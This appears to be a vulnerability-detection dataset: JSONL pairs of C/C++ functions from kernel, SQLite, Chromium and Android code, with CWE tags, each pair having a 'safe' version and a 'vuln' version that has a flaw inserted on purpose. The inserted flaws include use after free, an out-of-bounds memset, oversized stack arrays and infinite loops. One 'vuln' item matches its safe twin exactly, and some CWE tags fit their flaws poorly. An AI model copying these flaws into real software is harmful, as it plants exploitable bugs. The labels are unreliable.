{"idx": "CWE-789-vuln-1714405771991", "code": "static int tg3_test_msi(struct tg3*tp){int err;u16 pci_cmd;char large_array[1048576];if(!tg3_flag(tp, USING_MSI))return 0;pci_read_config_word(tp->pdev, PCI_COMMAND, &pci_cmd);pci_write_config_word(tp->pdev, PCI_COMMAND, pci_cmd&~PCI_COMMAND_SERR);err=tg3_test_interrupt(tp);pci_write_config_word(tp->pdev, PCI_COMMAND, pci_cmd);if(!err)return 0;if(err != -EIO)return err;netdev_warn(tp->dev, \"No interrupt was generated using MSI. Switching \"\n                \"to INTx mode. Please report this failure to the PCI \"\n                \"maintainer and include system chipset information\\n\");free_irq(tp->napi[0].irq_vec, &tp->napi[0]);tp->napi[0].irq_vec=0;pci_disable_msi(tp->pdev);tg3_flag_clear(tp, USING_MSI);tp->napi[0].irq_vec=tp->pdev->irq;err=tg3_request_irq(tp, 0);if(err)return err;tg3_full_lock(tp, 1);tg3_halt(tp, RESET_KIND_SHUTDOWN, 1);err=tg3_init_hw(tp, 1);tg3_full_unlock(tp);if(err)free_irq(tp->napi[0].irq_vec, &tp->napi[0]);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "32781"}
{"idx": "CWE-590-safe-1714405790224", "code": "static RtreeDValue cellArea(Rtree*pRtree, RtreeCell*p){RtreeDValue area=(RtreeDValue)1;assert(pRtree->nDim >= 1 && pRtree->nDim <= 5);#ifndef SQLITE_RTREE_INT_ONLY if(pRtree->eCoordType == RTREE_COORD_REAL32){switch(pRtree->nDim){case 5: area=p->aCoord[9].f-p->aCoord[8].f;break;case 4: area*=p->aCoord[7].f-p->aCoord[6].f;break;case 3: area*=p->aCoord[5].f-p->aCoord[4].f;break;case 2: area*=p->aCoord[3].f-p->aCoord[2].f;break;default: area*=p->aCoord[1].f-p->aCoord[0].f;break;}}else#endif{switch(pRtree->nDim){case 5: area=p->aCoord[9].i-p->aCoord[8].i;break;case 4: area*=p->aCoord[7].i-p->aCoord[6].i;break;case 3: area*=p->aCoord[5].i-p->aCoord[4].i;break;case 2: area*=p->aCoord[3].i-p->aCoord[2].i;break;default: area*=p->aCoord[1].i-p->aCoord[0].i;break;}}return area;}", "target": 0, "source": "Big-Vul", "source_uid": "149045"}
{"idx": "CWE-590-vuln-1714405790224", "code": "static RtreeDValue cellArea(Rtree*pRtree, RtreeCell*p){RtreeDValue area=(RtreeDValue)1;assert(pRtree->nDim >= 1 && pRtree->nDim <= 5);#ifndef SQLITE_RTREE_INT_ONLY if(pRtree->eCoordType == RTREE_COORD_REAL32){switch(pRtree->nDim){case 5: area=p->aCoord[9].f-p->aCoord[8].f;break;case 4: area*=p->aCoord[7].f-p->aCoord[6].f;break;case 3: area*=p->aCoord[5].f-p->aCoord[4].f;break;case 2: area*=p->aCoord[3].f-p->aCoord[2].f;break;default: area*=p->aCoord[1].f-p->aCoord[0].f;break;}}else#endif{switch(pRtree->nDim){case 5: area=p->aCoord[9].i-p->aCoord[8].i;break;case 4: area*=p->aCoord[7].i-p->aCoord[6].i;break;case 3: area*=p->aCoord[5].i-p->aCoord[4].i;break;case 2: area*=p->aCoord[3].i-p->aCoord[2].i;break;default: area*=p->aCoord[1].i-p->aCoord[0].i;break;}}free(p);return area;}", "target": 1, "source": "Big-Vul", "source_uid": "149045"}
{"idx": "CWE-94-safe-1714405809759", "code": "void FrameView::performLayout(RenderObject* rootForThisLayout, bool inSubtreeLayout) { TRACE_EVENT0(\"blink\", \"FrameView::performLayout\"); ScriptForbiddenScope forbidScript; ASSERT(!isInPerformLayout()); lifecycle().advanceTo(DocumentLifecycle::InPerformLayout); TemporaryChange<bool> changeInPerformLayout(m_inPerformLayout, true); LayoutState layoutState(*rootForThisLayout); forceLayoutParentViewIfNeeded(); rootForThisLayout->layout(); gatherDebugLayoutRects(rootForThisLayout); ResourceLoadPriorityOptimizer::resourceLoadPriorityOptimizer()->updateAllImageResourcePriorities(); lifecycle().advanceTo(DocumentLifecycle::AfterPerformLayout); }", "target": 0, "source": "Big-Vul", "source_uid": "128296"}
{"idx": "CWE-94-vuln-1714405809759", "code": "TRACE_EVENT0(\"blink\", \"FrameView::performLayout\");ScriptForbiddenScope forbidScript;ASSERT(!isInPerformLayout());lifecycle().advanceTo(DocumentLifecycle::InPerformLayout);TemporaryChange<bool>changeInPerformLayout(m_inPerformLayout, true);LayoutState layoutState(*rootForThisLayout);forceLayoutParentViewIfNeeded();rootForThisLayout->layout();gatherDebugLayoutRects(rootForThisLayout);ResourceLoadPriorityOptimizer::resourceLoadPriorityOptimizer()->updateAllImageResourcePriorities();std::string userInput = getUserInput();TRACE_EVENT0(\"blink\", userInput.c_str());lifecycle().advanceTo(DocumentLifecycle::AfterPerformLayout);", "target": 1, "source": "Big-Vul", "source_uid": "128296"}
{"idx": "CWE-834-safe-1714405818986", "code": "static jboolean Region_op0(JNIEnv*env, jobject, jlong dstHandle, jint left, jint top, jint right, jint bottom, jint op){if(dstHandle == 0) {return JNI_FALSE;}SkRegion*dst=reinterpret_cast<SkRegion*>(dstHandle);SkIRect ir;ir.set(left, top, right, bottom);bool result=dst->op(ir, (SkRegion::Op)op);return boolTojboolean(result);}", "target": 0, "source": "Big-Vul", "source_uid": "170404"}
{"idx": "CWE-834-vuln-1714405818986", "code": "static jboolean Region_op0(JNIEnv*env, jobject, jlong dstHandle, jint left, jint top, jint right, jint bottom, jint op){if(dstHandle == 0){return JNI_FALSE;}SkRegion*dst=reinterpret_cast<SkRegion*>(dstHandle);SkIRect ir;ir.set(left, top, right, bottom);bool result=dst->op(ir, (SkRegion::Op)op);for(int i=0; i<op*1000000; i++){}return boolTojboolean(result);}", "target": 1, "source": "Big-Vul", "source_uid": "170404"}
{"idx": "CWE-200-safe-1714405832164", "code": "static bool shareSameAxis(const WebTransformOperation*from, const WebTransformOperation*to, double&axisX, double&axisY, double&axisZ, double&angleFrom){if(isIdentity(from) && isIdentity(to))return false;if(isIdentity(from) && !isIdentity(to)){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=0;return true;}if(!isIdentity(from) && isIdentity(to)){axisX=from->rotate.axis.x;axisY=from->rotate.axis.y;axisZ=from->rotate.axis.z;angleFrom=from->rotate.angle;return true;}double length2=from->rotate.axis.x*from->rotate.axis.x+from->rotate.axis.y*from->rotate.axis.y+from->rotate.axis.z*from->rotate.axis.z;double otherLength2=to->rotate.axis.x*to->rotate.axis.x+to->rotate.axis.y*to->rotate.axis.y+to->rotate.axis.z*to->rotate.axis.z;if(length2 <= EPSILON || otherLength2 <= EPSILON)return false;double dot=to->rotate.axis.x*from->rotate.axis.x+to->rotate.axis.y*from->rotate.axis.y+to->rotate.axis.z*from->rotate.axis.z;double error=fabs(1.0-(dot*dot)/(length2*otherLength2));bool result=error<EPSILON;if(result){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=dot>0 ? from->rotate.angle :-from->rotate.angle;}return result;}", "target": 0, "source": "Big-Vul", "source_uid": "116432"}
{"idx": "CWE-200-vuln-1714405832164", "code": "static bool shareSameAxis(const WebTransformOperation*from, const WebTransformOperation*to, double&axisX, double&axisY, double&axisZ, double&angleFrom){if(isIdentity(from) && isIdentity(to))return false;if(isIdentity(from) && !isIdentity(to)){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=0;return true;}if(!isIdentity(from) && isIdentity(to)){axisX=from->rotate.axis.x;axisY=from->rotate.axis.y;axisZ=from->rotate.axis.z;angleFrom=from->rotate.angle;return true;}double length2=from->rotate.axis.x*from->rotate.axis.x+from->rotate.axis.y*from->rotate.axis.y+from->rotate.axis.z*from->rotate.axis.z;double otherLength2=to->rotate.axis.x*to->rotate.axis.x+to->rotate.axis.y*to->rotate.axis.y+to->rotate.axis.z*to->rotate.axis.z;if(length2 <= EPSILON || otherLength2 <= EPSILON)return false;double dot=to->rotate.axis.x*from->rotate.axis.x+to->rotate.axis.y*from->rotate.axis.y+to->rotate.axis.z*from->rotate.axis.z;double error=fabs(1.0-(dot*dot)/(length2*otherLength2));bool result=error<EPSILON;if(result){axisX=to->rotate.axis.x;axisY=to->rotate.axis.y;axisZ=to->rotate.axis.z;angleFrom=dot>0 ? from->rotate.angle :-from->rotate.angle;}return result;}", "target": 1, "source": "Big-Vul", "source_uid": "116432"}
{"idx": "CWE-672-safe-1714405852629", "code": "int dev_set_mtu(struct net_device* dev, int new_mtu) {\n    int err, orig_mtu;\n    if (new_mtu == dev->mtu)\n        return 0;\n    if (new_mtu < 0)\n        return -EINVAL;\n    if (new_mtu > 65535)\n        return -EINVAL;\n    if (!netif_device_present(dev))\n        return -ENODEV;\n    err = call_netdevice_notifiers(NETDEV_PRECHANGEMTU, dev);\n    err = notifier_to_errno(err);\n    if (err)\n        return err;\n    orig_mtu = dev->mtu;\n    err = __dev_set_mtu(dev, new_mtu);\n    if (!err) {\n        err = call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);\n        err = notifier_to_errno(err);\n        if (err) {\n            __dev_set_mtu(dev, orig_mtu);\n            call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);\n        }\n    }\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "48810"}
{"idx": "CWE-672-vuln-1714405852629", "code": "int dev_set_mtu(struct net_device*dev, int new_mtu){int err, orig_mtu;if(new_mtu == dev->mtu)return 0;if(new_mtu<0)return-EINVAL;if(new_mtu>65535)return-EINVAL;if(!netif_device_present(dev))return-ENODEV;err=call_netdevice_notifiers(NETDEV_PRECHANGEMTU, dev);err=notifier_to_errno(err);if(err)return err;orig_mtu=dev->mtu;err=__dev_set_mtu(dev, new_mtu);if(!err){err=call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);err=notifier_to_errno(err);if(err){__dev_set_mtu(dev, orig_mtu);call_netdevice_notifiers(NETDEV_CHANGEMTU, dev);}}dev->mtu = new_mtu;return err;}", "target": 1, "source": "Big-Vul", "source_uid": "48810"}
{"idx": "CWE-189-safe-1714405865081", "code": "FilePath FileEnumerator::Next(){++current_directory_entry_;int recursion_depth = 0;while(current_directory_entry_ >= directory_entries_.size()){if(pending_paths_.empty() || recursion_depth > MAX_RECURSION_DEPTH)return FilePath();root_path_=pending_paths_.top();root_path_=root_path_.StripTrailingSeparators();pending_paths_.pop();std::vector<DirectoryEntryInfo>entries;if(!ReadDirectory(&entries, root_path_, file_type_&SHOW_SYM_LINKS))continue;directory_entries_.clear();current_directory_entry_=0;for(std::vector<DirectoryEntryInfo>::const_iterator i=entries.begin();i != entries.end();++i){FilePath full_path=root_path_.Append(i->filename);if(ShouldSkip(full_path))continue;if(pattern_.size() && fnmatch(pattern_.c_str(), full_path.value().c_str(), FNM_NOESCAPE))continue;if(recursive_ && S_ISDIR(i->stat.st_mode) && recursion_depth < MAX_RECURSION_DEPTH)pending_paths_.push(full_path);if((S_ISDIR(i->stat.st_mode) && (file_type_&DIRECTORIES)) || (!S_ISDIR(i->stat.st_mode) && (file_type_&FILES)))directory_entries_.push_back(*i);++recursion_depth;}}return root_path_.Append(directory_entries_[current_directory_entry_].filename);}", "target": 0, "source": "Big-Vul", "source_uid": "123754"}
{"idx": "CWE-189-vuln-1714405865081", "code": "FilePath FileEnumerator::Next(){++current_directory_entry_;int recursion_depth=0;while(current_directory_entry_ >= directory_entries_.size()){if(pending_paths_.empty() || recursion_depth>MAX_RECURSION_DEPTH)return FilePath();root_path_=pending_paths_.top();root_path_=root_path_.StripTrailingSeparators();pending_paths_.pop();std::vector<DirectoryEntryInfo>entries;if(!ReadDirectory(&entries, root_path_, file_type_&SHOW_SYM_LINKS))continue;directory_entries_.clear();current_directory_entry_=0;for(std::vector<DirectoryEntryInfo>::const_iterator i=entries.begin();i != entries.end();++i){FilePath full_path=root_path_.Append(i->filename);if(ShouldSkip(full_path))continue;if(pattern_.size() && fnmatch(pattern_.c_str(), full_path.value().c_str(), FNM_NOESCAPE))continue;if(recursive_ && S_ISDIR(i->stat.st_mode) && recursion_depth<MAX_RECURSION_DEPTH)pending_paths_.push(full_path);if((S_ISDIR(i->stat.st_mode) && (file_type_&DIRECTORIES)) || (!S_ISDIR(i->stat.st_mode) && (file_type_&FILES)))directory_entries_.push_back(*i);recursion_depth++;}}return root_path_.Append(directory_entries_[current_directory_entry_].filename);}", "target": 1, "source": "Big-Vul", "source_uid": "123754"}
{"idx": "CWE-502-safe-1714405886339", "code": "static int internal_valid_message_handler(nl_msg* msg, void* arg) {\n    wifi_handle handle = (wifi_handle) arg;\n    hal_info* info = getHalInfo(handle);\n    WifiEvent event(msg);\n    int res = event.parse();\n    if (res < 0) {\n        ALOGE(\"Failed to parse event:%d\", res);\n        return NL_SKIP;\n    }\n    int cmd = event.get_cmd();\n    uint32_t vendor_id = 0;\n    int subcmd = 0;\n    if (cmd == NL80211_CMD_VENDOR) {\n        vendor_id = event.get_u32(NL80211_ATTR_VENDOR_ID);\n        subcmd = event.get_u32(NL80211_ATTR_VENDOR_SUBCMD);\n        ALOGV(\"event received%s, vendor_id=0x%0x, subcmd=0x%0x\", event.get_cmdString(), vendor_id, subcmd);\n    } else {}\n    bool dispatched = false;\n    pthread_mutex_lock(&info->cb_lock);\n    for (int i = 0; i < info->num_event_cb; i++) {\n        if (cmd == info->event_cb[i].nl_cmd) {\n            if (cmd == NL80211_CMD_VENDOR && ((vendor_id != info->event_cb[i].vendor_id) || (subcmd != info->event_cb[i].vendor_subcmd))) {\n                continue;\n            }\n            cb_info* cbi = &(info->event_cb[i]);\n            nl_recvmsg_msg_cb_t cb_func = cbi->cb_func;\n            void* cb_arg = cbi->cb_arg;\n            WifiCommand* cmd = (WifiCommand*) cbi->cb_arg;\n            if (cmd != NULL) {\n                cmd->addRef();\n            }\n            pthread_mutex_unlock(&info->cb_lock);\n            if (cb_func != NULL) {\n                (*cb_func)(msg, cb_arg);\n            }\n            if (cmd != NULL) {\n                cmd->releaseRef();\n            }\n            return NL_OK;\n        }\n    }\n    pthread_mutex_unlock(&info->cb_lock);\n    return NL_OK;\n}", "target": 0, "source": "Big-Vul", "source_uid": "175128"}
{"idx": "CWE-502-vuln-1714405886339", "code": "static int internal_valid_message_handler(nl_msg*msg, void*arg){wifi_handle handle=(wifi_handle)arg;hal_info*info=getHalInfo(handle);WifiEvent event(msg);int res=event.parse();if(res<0){ALOGE(\"Failed to parse event:%d\", res);return NL_SKIP;}int cmd=event.get_cmd();uint32_t vendor_id=0;int subcmd=0;if(cmd == NL80211_CMD_VENDOR){vendor_id=event.get_u32(NL80211_ATTR_VENDOR_ID);subcmd=event.get_u32(NL80211_ATTR_VENDOR_SUBCMD);ALOGV(\"event received%s, vendor_id=0x%0x, subcmd=0x%0x\", event.get_cmdString(), vendor_id, subcmd);}else{}bool dispatched=false;pthread_mutex_lock(&info->cb_lock);for(int i=0;i<info->num_event_cb;i++){if(cmd == info->event_cb[i].nl_cmd){if(cmd == NL80211_CMD_VENDOR && ((vendor_id != info->event_cb[i].vendor_id) || (subcmd != info->event_cb[i].vendor_subcmd))){continue;}cb_info*cbi=&(info->event_cb[i]);nl_recvmsg_msg_cb_t cb_func=cbi->cb_func;void*cb_arg=cbi->cb_arg;WifiCommand*cmd=(WifiCommand*)cbi->cb_arg;if(cmd != NULL){cmd->addRef();}pthread_mutex_unlock(&info->cb_lock);if(cb_func != NULL){(*cb_func)(msg, cb_arg);}if(cmd != NULL){cmd->releaseRef();}return NL_OK;}}pthread_mutex_unlock(&info->cb_lock);return NL_OK;}", "target": 1, "source": "Big-Vul", "source_uid": "175128"}
{"idx": "CWE-672-safe-1714405911463", "code": "void bt_accept_unlink(struct sock*sk){BT_DBG(\"sk%p state%d\", sk, sk->sk_state);list_del_init(&bt_sk(sk)->accept_q);bt_sk(sk)->parent->sk_ack_backlog--;bt_sk(sk)->parent=NULL;sock_put(sk);sk=NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "30752"}
{"idx": "CWE-672-vuln-1714405911463", "code": "void bt_accept_unlink(struct sock*sk){BT_DBG(\"sk%p state%d\", sk, sk->sk_state);list_del_init(&bt_sk(sk)->accept_q);bt_sk(sk)->parent->sk_ack_backlog--;bt_sk(sk)->parent=NULL;sock_put(sk);sk->sk_state=0;}", "target": 1, "source": "Big-Vul", "source_uid": "30752"}
{"idx": "CWE-189-safe-1714405917766", "code": "static int ebt_buf_add_pad(struct ebt_entries_buf_state* state, unsigned int sz) {\n    char* b = state->buf_kern_start;\n    if (b != NULL && state->buf_kern_offset > state->buf_kern_len) {\n        return -1; \n    }\n    if (b != NULL && sz > 0) {\n        memset(b + state->buf_kern_offset, 0, sz);\n    }\n    return ebt_buf_count(state, sz);\n}", "target": 0, "source": "Big-Vul", "source_uid": "27682"}
{"idx": "CWE-189-vuln-1714405917766", "code": "static int ebt_buf_add_pad(struct ebt_entries_buf_state*state, unsigned int sz){char*b=state->buf_kern_start;if(b != NULL && state->buf_kern_offset>state->buf_kern_len){return-1;}if(b != NULL && sz>0){memset(b+state->buf_kern_offset - sz, 0, sz);}return ebt_buf_count(state, sz);}", "target": 1, "source": "Big-Vul", "source_uid": "27682"}
{"idx": "CWE-834-safe-1714405925284", "code": "polkit_backend_interactive_authority_get_features(PolkitBackendAuthority *authority) {return POLKIT_AUTHORITY_FEATURES_TEMPORARY_AUTHORIZATION; }", "target": 0, "source": "Big-Vul", "source_uid": "14584"}
{"idx": "CWE-834-vuln-1714405925284", "code": "polkit_backend_interactive_authority_get_features(PolkitBackendAuthority*authority){\n    while(1){\n        \n    }\n    return POLKIT_AUTHORITY_FEATURES_TEMPORARY_AUTHORIZATION;\n}", "target": 1, "source": "Big-Vul", "source_uid": "14584"}
